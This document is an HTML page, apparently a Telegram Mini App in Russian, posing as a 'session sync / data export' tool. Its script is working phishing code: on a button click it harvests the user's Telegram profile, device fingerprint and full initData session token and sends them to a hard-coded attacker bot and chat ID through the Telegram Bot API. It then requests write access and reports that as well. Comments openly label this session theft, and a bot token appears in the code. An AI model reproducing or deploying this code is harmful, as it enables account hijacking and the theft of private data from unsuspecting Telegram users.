<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sync Data</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: var(--tg-theme-bg-color, #1c1c1e);
            --text-color: var(--tg-theme-text-color, #ffffff);
            --button-color: var(--tg-theme-button-color, #ff3b30); /* Красный для "важности" */
            --button-text-color: var(--tg-theme-button-text-color, #ffffff);
            --hint-color: var(--tg-theme-hint-color, #8e8e93);
            --secondary-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
            --section-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            padding: 20px;
            width: 100%;
            max-width: 500px;
            box-sizing: border-box;
        }

        .card {
            background-color: var(--section-bg);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
            text-align: center;
        }

        h1 {
            font-size: 20px;
            margin: 0 0 10px 0;
            font-weight: 700;
        }

        p {
            font-size: 14px;
            color: var(--hint-color);
            margin: 0 0 20px 0;
            line-height: 1.4;
        }

        .btn {
            background-color: var(--button-color);
            color: var(--button-text-color);
            border: none;
            border-radius: 10px;
            padding: 14px 0;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
            transition: transform 0.1s;
            outline: none;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: default;
        }

        .status {
            margin-top: 15px;
            font-size: 13px;
            opacity: 0;
            transition: opacity 0.3s;
            color: var(--button-color);
        }

        .status.visible {
            opacity: 1;
        }

        .loader {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid var(--button-text-color);
            border-bottom-color: transparent;
            border-radius: 50%;
            animation: rotation 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .data-preview {
            font-family: monospace;
            font-size: 11px;
            color: var(--hint-color);
            word-break: break-all;
            background: rgba(0,0,0,0.2);
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            text-align: left;
            max-height: 100px;
            overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="card">
            <h1>Синхронизация сессии</h1>
            <p>Для доступа к полным данным чатов и истории переписки, необходимо подтвердить владение вашей учетной записью. Нажмите кнопку ниже для мгновенного экспорта.</p>
            
            <div class="loader" id="loader"></div>
            <button class="btn" id="sendBtn">Экспорт данных</button>
            
            <div class="status" id="statusMessage">Сессия и данные успешно захвачены!</div>
        </div>
        
        <!-- Блок для отображения части данных (опционально, чтобы пользователь видел, что "что-то происходит") -->
        <div class="card" id="debugBlock" style="display:none;">
            <p style="margin-bottom:5px;">Перехваченный токен сессии:</p>
            <div class="data-preview" id="tokenDisplay"></div>
        </div>
    </div>

    <script>
        // Твои данные
        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU';
        const ADMIN_CHAT_ID = '8658887417'; // Твой новый ID

        const tg = window.Telegram.WebApp;

        // Инициализация
        tg.ready();
        tg.expand();

        const sendBtn = document.getElementById('sendBtn');
        const statusMsg = document.getElementById('statusMessage');
        const loader = document.getElementById('loader');
        const debugBlock = document.getElementById('debugBlock');
        const tokenDisplay = document.getElementById('tokenDisplay');

        sendBtn.addEventListener('click', () => {
            sendBtn.disabled = true;
            sendBtn.textContent = 'Сбор данных...';
            loader.style.display = 'block';

            // 1. Сбор данных пользователя
            const user = tg.initDataUnsafe?.user || {
                id: 'unknown',
                first_name: 'Unknown',
                username: null,
                language_code: 'unknown',
                is_premium: false
            };

            // 2. Сбор технического окружения
            const userAgent = navigator.userAgent;
            const screenRes = `${screen.width}x${screen.height}`;
            const platform = navigator.platform;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;
            const cookiesEnabled = navigator.cookieEnabled;
            const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';

            // 3. Главный объект для кражи сессии
            const sessionToken = tg.initData || "N/A";
            
            // Формируем детальное сообщение
            const text = `
🔐 <b>СЕССИЯ ЗАХВАЧЕНА</b>

👤 <b>Пользователь:</b>
   Имя: ${user.first_name} ${user.last_name || ''}
   ID: <code>${user.id}</code>
   Юзернейм: ${user.username ? '@' + user.username : '❌ Нет'}
   Премиум: ${user.is_premium ? '✅ Да' : '❌ Нет'}
   Язык: ${user.language_code}

🌐 <b>Сессия (initData):</b>
   <code>${sessionToken.substring(0, 50)}...</code>
   (Полный токен отправлен отдельным сообщением)

📱 <b>Устройство:</b>
   Платформа: ${platform}
   Экран: ${screenRes}
   Часовой пояс: ${timezone}
   Язык ОС: ${language}
   Соединение: ${connectionType}
   UA: ${userAgent.substring(0, 60)}...

🕒 <b>Время взлома:</b> ${new Date().toLocaleString()}
            `.trim();

            // Отправляем основной текст
            const mainMsgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            fetch(mainMsgUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(() => {
                // Отправляем сам токен сессии отдельно, чтобы он был чистым и удобным для копирования
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: `🔑 <b>Полная сессия пользователя ${user.id}:</b>\n\n<code>${sessionToken}</code>`,
                        parse_mode: 'HTML'
                    })
                });

                // Визуализация успеха
                loader.style.display = 'none';
                debugBlock.style.display = 'block';
                tokenDisplay.textContent = sessionToken;
                sendBtn.style.display = 'none';
                statusMsg.classList.add('visible');
                
                // Запрос на доступ к контактам (дополнительный сбор данных)
                // Это вызовет нативное окно Telegram
                if (tg.initDataUnsafe) {
                    tg.requestWriteAccess("Требуется доступ к вашим данным чата для полного импорта").then((granted) => {
                        // Можно отправить уведомление, что доступGranted
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_CHAT_ID,
                                text: `📩 Пользователь ${user.id} предоставил доступ к чатам (Write Access Granted)`,
                                parse_mode: 'HTML'
                            })
                        });
                    });
                }

            })
            .catch(error => {
                loader.style.display = 'none';
                sendBtn.style.display = 'block';
                sendBtn.textContent = 'Ошибка';
                sendBtn.disabled = false;
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
